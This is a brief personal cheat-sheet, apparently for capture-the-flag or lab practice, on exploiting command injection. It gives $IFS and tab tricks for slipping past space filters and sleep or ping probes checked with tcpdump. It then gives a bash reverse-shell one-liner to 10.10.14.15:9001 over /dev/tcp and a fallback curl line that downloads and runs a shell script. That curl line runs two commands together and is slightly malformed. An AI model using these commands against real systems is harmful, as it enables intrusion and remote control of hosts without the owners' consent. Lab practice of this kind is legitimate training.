$IFS = space
tab is a space

if trying command injection, try to do a sleep to get it working first
or try to do a ping to local ip address

if trying ping, do a tcpdump on the ip address using: sudo tcpdump -n -i tun0 icmp

if command injection works, create a bash shell

bash -c 'bash -i >& /dev/tcp/10.10.14.15/9001 0>&1'

if the bash doesnt work, try to do with curl

curl -o /dev/shm/shell.sh http://ip:port bash /dev/shm/shell.sh
